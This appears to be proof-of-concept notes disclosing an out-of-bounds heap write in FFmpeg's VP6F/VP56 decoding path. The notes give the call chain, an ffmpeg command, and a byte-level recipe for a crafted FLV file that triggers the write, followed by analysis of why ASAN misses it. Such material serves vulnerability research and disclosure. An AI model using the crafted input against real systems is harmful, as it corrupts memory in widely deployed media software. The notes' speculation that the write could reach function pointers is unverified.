# PoC Notes: Heap OOB Write in ff_vp3dsp_set_bounding_values via VP56 Context

## Vulnerability Summary

CWE-787 (Out-of-bounds Write) in `ff_vp3dsp_set_bounding_values` (libavcodec/vp3dsp.c:497-502).

`bounding_values_array[256]` is declared in `VP56Context` (vp56.h:171). The function receives a pointer `bounding_values = bounding_values_array + 127` and unconditionally writes to:

- **x86 (ARCH_X86=1)**: `bounding_values[129..132]` = `bounding_values_array[256..259]` — 4 ints past the 256-element boundary
- **non-x86**: `bounding_values[129..130]` = `bounding_values_array[256..257]` — 2 ints past boundary

On this system (x86_64, ARCH_X86=1), all four writes execute via:
```c
bounding_values[129] = bounding_values[130] =
bounding_values[131] = bounding_values[132] = filter_limit * 0x00020002U;
```

## Trigger Path

```
ffmpeg -i vuln_001_input.flv -f null -
  → FLV demuxer opens VP6F video stream
  → ff_vp56_decode_frame (vp56.c:607)
  → vp6_parse_header (vp6.c:66)         ← quantizer extracted from buf[0]
  → ff_vp56_init_dequant (vp56.c:39)    ← condition: s->quantizer != quantizer
  → ff_vp3dsp_set_bounding_values(s->bounding_values_array, filter_limit)
  → writes to bounding_values_array[256..259]  ← OOB
```

The call to `ff_vp56_init_dequant` occurs at vp6_parse_header line 66, **before any validation** of frame dimensions, sub_version, or other fields. Even a partially malformed frame triggers the write.

## FLV Construction

The crafted file encodes a VP6F keyframe with quantizer=63 (maximum, 6-bit field in buf[0]):

```
FLV header:   "FLV" + version(1) + flags(0x01) + offset(9)
PrevTagSize0: 0x00000000
VideoTag:
  header:     type(0x09) + size(3B) + ts(3B) + tsExt(1B) + sid(3B)
  codec byte: 0x14 = keyframe(1) | VP6(4)
  VP6 extra:  0x00  (crop offset, consumed as extradata by FLV demuxer)
  VP6 frame:
    buf[0] = 0x7E: bit7=0(keyframe), bits6:1=111111(qp=63), bit0=0(no_sep_coeff)
    buf[1] = 0x30: sub_version=6(<8), filter_header=0, interlaced=0
    buf[2:3] = 0x000A: coeff_offset field (→ coeff_offset=8 after -2)
    buf[4] = 0x02: rows=2 (32px, non-zero)
    buf[5] = 0x02: cols=2 (32px, non-zero)
    buf[6:7] = 0x0202: displayed rows/cols
    buf[8:] = 0x00*128: range coder input (zeros are valid)
```

**File size note**: The FLV probe function requires `data_offset + 100 < file_size` (i.e. ≥ 110 bytes). The 128-byte range coder padding satisfies this (file = 166 bytes).

## Why ASAN Does Not Fire

`bounding_values_array[256]` is **not** at the boundary of a heap allocation. `VP56Context` is a single struct allocated as `avctx->priv_data`. The fields immediately following `bounding_values_array[256]` in the struct are:

```c
DECLARE_ALIGNED(8, int, bounding_values_array)[256];  // 1024 bytes
uint8_t coeff_ctx[4][64];                             // 256 bytes (next field)
```

The 4 OOB writes land 0–15 bytes into `coeff_ctx`, well within the same heap allocation. ASAN's red zones exist at allocation boundaries, not between struct fields, so no ASAN report is generated.

## Impact

The corruption of `coeff_ctx` bytes 0–15 has no immediate crash effect in VP6F decode because `coeff_ctx` is used only by the VP5 codec path. However:

- The write value (`filter_limit * 0x00020002`) is data-dependent and attacker-controlled (quantizer comes directly from the bitstream).
- In a concurrent or follow-up decode, the corrupted region could affect VP5 path behavior.
- On real (non-ASAN) builds or with different struct layouts (compiler version, alignment options), the overflow may reach beyond `coeff_ctx` into function pointers (`parse_coeff`, `parse_header`, etc.) at vp56.h:192–196.

## Observed Result

- ffmpeg successfully opened and decoded the crafted file: `frame=1 fps=0.0`
- No ASAN report (intra-struct overflow)
- Status: **VERIFIED_BEHAVIOR** — OOB write confirmed to execute; no crash in this configuration
